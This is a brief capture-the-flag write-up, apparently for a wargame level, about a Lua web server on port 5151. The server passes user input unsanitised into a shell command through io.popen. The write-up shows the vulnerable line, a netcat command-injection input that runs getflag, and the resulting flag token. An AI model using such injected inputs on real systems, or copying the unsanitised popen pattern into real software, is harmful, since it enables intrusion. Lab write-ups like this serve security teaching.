We realize that there is a file in user folder, level11.lua.

This file is a script for a web server, accepting connections in port 5151. It receives a string and execute a hash function, comparing it with another hash string it has.

When creating the hash for the string, we observe it is opening a process executing a shell command:

  prog = io.popen("echo "..pass.." | sha1sum", "r")

There is a vulnerability here because we can inject whatever we want in the pass variable to be executed. We take advantage of this trough netcat:

nc localhost 5151

hola && getflag > /tmp/flag && echo adios

And we successfully write the flag in /tmp/flag

cat /tmp/flag -> Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
